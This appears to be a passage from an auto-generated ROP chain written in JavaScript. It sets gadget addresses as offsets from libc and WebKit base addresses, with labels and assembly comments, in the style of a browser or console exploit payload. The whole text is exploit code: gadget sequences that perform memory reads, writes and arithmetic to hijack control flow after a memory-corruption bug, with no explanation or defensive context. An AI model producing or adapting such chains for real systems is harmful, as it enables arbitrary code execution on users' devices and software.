db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1078424, //L752
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1078440, //L753
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L753:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1078584, //L757
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1078552, //L755
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1078568, //L756
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L755:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L756:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L757:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1078656, //L759
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L759:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1078712, //L760
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1078792, //L762
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L762:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L763:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L764:
db([5, 0]); // 0x5
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1078904, //L765
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1078920, //L766
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L765:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1079008, //L768
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L768:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1079064, //L769
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L769:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1079184, //L772
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L771:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L772:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1079272, //L774
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1079288, //L775
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L774:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1079432, //L779
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1079400, //L777
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1079416, //L778
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1079504, //L781
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L781:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1079560, //L782
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L782:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1079640, //L784
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L784:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L785:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L786:
db([11, 0]); // 0xb
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1079752, //L787
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1079768, //L788
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1079856, //L790
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L790:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1079912, //L791
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L791:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1079984, //L794
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L794:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1080040, //L795
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L795:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L797:
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1080192, //L799
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L798:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L799:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1080280, //L801
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1080296, //L802
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L801:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L802:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1080440, //L806
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1080408, //L804
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1080424, //L805
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1080512, //L808
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L808:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1080568, //L809
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L809:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1080648, //L811
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L811:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L812:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L813:
db([12, 0]); // 0xc
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1080760, //L814
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1080776, //L815
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1080864, //L817
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L817:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1080920, //L818
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L818:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1080992, //L821
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L821:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1081048, //L822
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L822:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L824:
libc_base+428453, //mov rax, rdx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1081200, //L826
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L825:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1081288, //L828
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1081304, //L829
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L828:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L829:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1081448, //L833
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1081416, //L831
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1081432, //L832
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1081520, //L835
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L835:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1081576, //L836
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L836:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1081656, //L838
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L838:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L839:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L840:
db([13, 0]); // 0xd
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1081768, //L841
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1081784, //L842
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1081872, //L844
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L844:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1081928, //L845
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L845:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1082000, //L848
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L848:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1082056, //L849
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L849:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L851:
libc_base+764760, //pop rsi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1082208, //L853
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L852:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L853:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1082296, //L855
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1082312, //L856
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L855:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1082456, //L860
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1082424, //L858
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1082440, //L859
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L860:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1082528, //L862
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L862:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1082584, //L863
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L863:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1082664, //L865
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L865:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L866:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L867:
db([14, 0]); // 0xe
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1082776, //L868
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1082792, //L869
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L868:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1082880, //L871
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L871:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1082936, //L872
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L872:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1083008, //L875
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L875:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1083064, //L876
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L876:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1083168, //L879
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L878:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1083256, //L881
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1083272, //L882
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L882:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1083416, //L886
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1083384, //L884
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1083400, //L885
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L884:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L885:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L886:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1083488, //L888
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L888:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1083544, //L889
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1083624, //L891
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L891:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L892:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L893:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1083736, //L894
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1083752, //L895
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L894:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L895:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1083840, //L897
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L897:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1083896, //L898
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L898:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1084016, //L901
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L900:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L901:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1084104, //L903
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1084120, //L904
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L903:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L904:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1084264, //L908
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1084232, //L906
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1084248, //L907
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
